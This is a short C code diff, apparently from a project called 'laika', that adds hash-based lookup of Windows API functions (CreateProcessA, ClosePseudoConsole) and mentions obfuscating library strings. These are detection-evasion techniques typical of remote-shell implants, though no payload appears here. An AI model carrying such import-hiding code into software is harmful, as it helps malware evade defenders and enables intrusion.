@@ -137,10 +137,10 @@ _findByHashFail:
 
 _ShellExecuteA oShellExecuteA;
 _CreatePseudoConsole oCreatePseudoConsole;
+_ClosePseudoConsole oClosePseudoConsole;
+_CreateProcessA oCreateProcessA;
 
-/* todo api:
-    ClosePseudoConsole
-    CreateProcessA
+/* TODO:
     GetEnvironmentVariable
 */
 
@@ -151,13 +151,10 @@ void laikaO_init()
     /* TODO: these library strings should probably be obfuscated (by a skid box maybe?) */
     oShellExecuteA = (_ShellExecuteA)findByHash("shell32.dll", 0x89858cd3);
     oCreatePseudoConsole = (_CreatePseudoConsole)findByHash("kernel32.dll", 0x7310ef7);
+    oClosePseudoConsole = (_ClosePseudoConsole)findByHash("kernel32.dll", 0xeff42590);
+    oCreateProcessA = (_CreateProcessA)findByHash("kernel32.dll", 0x9e687c1d);
 
 /*
-    hash = getHashName("CreateProcessA"); // 0x9e687c1d
-    printf("CreateProcessA: real is %p, hashed is %p. [HASH: %x]\n",
-           (void *)CreateProcessA,
-           findByHash("kernel32.dll", hash), hash);
-
     hash = getHashName("InitializeProcThreadAttributeList");
     printf("InitializeProcThreadAttributeList: real is %p, hashed is %p. [HASH: %x]\n",
            (void *)InitializeProcThreadAttributeList,
